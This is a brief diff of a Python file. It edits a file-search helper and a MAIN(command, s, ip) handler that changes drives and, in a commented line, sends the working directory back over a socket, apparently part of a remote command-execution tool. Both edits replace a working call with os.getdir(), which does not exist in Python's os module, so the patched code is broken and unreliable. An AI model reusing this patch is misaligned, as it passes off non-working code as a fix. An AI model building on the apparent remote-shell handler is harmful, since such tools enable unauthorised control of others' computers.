@@ -1107,7 +1107,7 @@ def find_file(path, d="max"):
     pa = None
     d1 = 0
     while d1 < d or max_flag:
-        pa, checked = wolk(subprocess.getoutput("cd"), path, checked=[])
+        pa, checked = wolk(os.getdir(), path, checked=[])
         if pa == None:
             break
         if pa not in pr:
@@ -1228,7 +1228,7 @@ def MAIN(command, s, ip):
             -1] == "B:" or (command.split(" "))[-1] == "D:" or (command.split(" "))[-1] == "Z:" or \
                 (command.split(" "))[-1] == "F:":
             os.chdir((command.split(" "))[-1])
-            # s.send((subprocess.getoutput("cd")).encode())
+            # s.send((os.getdir()).encode())
             pass
         elif ((command.split(" "))[-1] not in os.listdir(
                 "\\".join(((os.path.abspath((command.split(" "))[-1])).split("\\"))[0:-1]))) and (
